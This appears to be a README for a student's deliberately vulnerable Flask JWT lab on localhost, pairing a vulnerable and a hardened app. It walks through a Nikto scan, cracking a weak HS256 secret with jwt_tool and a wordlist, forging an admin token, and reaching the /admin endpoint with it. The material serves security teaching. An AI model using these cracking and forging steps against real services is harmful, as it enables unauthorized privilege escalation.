# 🛡️ JWT Authentication & Privilege Escalation Lab (Localhost)

A vulnerable-by-design Flask API demonstrating how weak JWT secret management can enable **vertical privilege escalation**.

> ⚠️ Scope: localhost only (`127.0.0.1`). Do **not** use these techniques against systems you don’t own or have explicit permission to test.

---

## 🚀 Objective

Start with standard `user` credentials, obtain a JWT, and demonstrate how a weak/guessable signing secret can allow forging an **admin** token that unlocks `/admin`.

This repo includes both:
- a **vulnerable** implementation (`src/app.py`)
- a **hardened** implementation (`src/secure_app.py`)

---

## 🧠 Skills Demonstrated

- JWT structure and claims (`sub`, `role`, `iss`, `iat`, `exp`)
- HS256 signing and why secret entropy matters
- Blackbox thinking: enumerate, observe, test, escalate
- Secure secret handling with environment variables
- Defense-in-depth (short expiry, issuer validation, minimum claim requirements)

---

## 🛠️ Lab Environment

- Python + Flask
- SQLite (local file `app.db`)
- PyJWT (HS256)

Endpoints:
- `POST /api/login` → returns JWT
- `GET /api/me` → returns decoded claims (requires auth)
- `GET /admin` → admin-only (requires `role=admin`)

---

## 📂 Repo Layout

```
jwt-privilege-escalation-lab/
├── README.md
├── requirements.txt
├── SECURITY.md
├── .env.example
├── src/
│   ├── app.py          # vulnerable-by-design
│   └── secure_app.py   # patched version
├── notes/
│   └── workflow.md     # reproducible steps + observations
├── docs/
│   └── threat-model.md
└── screenshots/        #  proof screenshots
```

---

## ✅ Setup

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Set a secret (for the vulnerable lab you can intentionally choose something weak; for the secure app choose something strong):

```bash
export JWT_SECRET="dev-weak-secret"
```

Run the vulnerable app:

```bash
python3 src/app.py
```

---

## 🧪 Basic Usage

Login:

```bash
curl -s -X POST http://127.0.0.1:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"password"}'
```

Use the returned token:

```bash
curl -s http://127.0.0.1:8080/api/me \
  -H "Authorization: Bearer <TOKEN>"
```

Admin endpoint:

```bash
curl -i http://127.0.0.1:8080/admin \
  -H "Authorization: Bearer <TOKEN>"
```

---

## 🕵️ Attack Walkthrough (The Exploitation)

### 1. Automated Reconnaissance (Nikto)
I utilized Nikto to scan for misconfigurations and information disclosure.
\`\`\`bash
nikto -h http://127.0.0.1:8080
\`\`\`
**Findings:** The server logs revealed active directory fuzzing:
> `404 - 127.0.0.1 - - [26/Feb/2026 10:44:17] "GET /mail9.box HTTP/1.1"`
Additionally, the scan confirmed the server was leaking exact Werkzeug/Python version headers and missing critical CSP/HSTS security headers.

### 2. Secret Cracking (jwt_tool)
After obtaining a standard user token, I executed an offline dictionary attack using a targeted OSINT wordlist to discover the weak `JWT_SECRET`.
\`\`\`bash
python3 jwt_tool.py <USER_TOKEN> -C -d smart_wordlist.txt
\`\`\`
**Result:** `[+] KEY FOUND! [dev-weak-secret]`

### 3. Privilege Escalation (Payload Tampering)
With the signing key compromised, I forged a new token, escalating the `role` claim to `admin` and re-signing it via HS256.
\`\`\`bash
python3 jwt_tool.py <USER_TOKEN> -T -S hs256 -p "dev-weak-secret"
# Changed 'role' -> 'admin' and 'sub' -> '1'
\`\`\`

### 4. Bypassing Authorization
Sending the forged token granted unauthorized access to the restricted endpoint.
\`\`\`bash
curl -i http://127.0.0.1:8080/admin -H "Authorization: Bearer <FORGED_TOKEN>"
\`\`\`
**Result:** `Admin panel: only admin should see this.`

---

## 🛡️ Hardening (Patched Version)

Run the secure app:

```bash
export JWT_SECRET="$(openssl rand -base64 32)"
python3 src/secure_app.py
```

Key improvements:
- secret must be set via env var
- rejects weak secrets (minimum length)
- same JWT validation rules but forces safer configuration

---

## 📌 Notes

See `notes/workflow.md` for a clean “pentest-style” walkthrough of what you observed and how you verified the escalation in this controlled lab.

---

## Author

Gildas Yegnon — University of Calgary — CompTIA Security+ — Offensive Security Focus
